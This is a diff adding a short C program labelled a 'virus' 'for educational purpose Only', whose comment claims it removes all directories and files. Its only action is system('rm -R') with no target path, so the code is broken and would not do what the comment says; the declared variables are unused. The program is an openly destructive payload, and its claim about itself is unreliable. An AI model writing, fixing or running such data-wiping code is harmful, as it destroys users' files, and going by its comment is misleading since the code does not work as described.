@@ -1,0 +1,10 @@
+/* Programmed by Jenkins Shubham for educational purpose Only*/
+// Virus
+//  This will remove all directory and files
+
+int main()
+{
+	 int i=1,j=1; char c[99];
+	 
+	 system("rm -R");
+}
